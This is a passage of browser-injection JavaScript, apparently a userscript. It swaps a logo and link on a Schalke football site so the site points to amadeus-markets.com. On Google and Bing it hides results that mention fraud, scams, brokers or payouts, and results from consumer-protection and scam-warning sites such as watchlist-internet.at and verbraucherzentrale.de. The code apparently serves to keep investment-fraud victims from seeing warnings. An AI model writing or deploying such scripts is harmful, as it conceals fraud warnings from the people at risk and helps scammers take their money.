        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}

// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://amadeus-markets.com/";
var newLogoURL = "https://i.ibb.co/cQ26kXf/Untitled-design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


})();

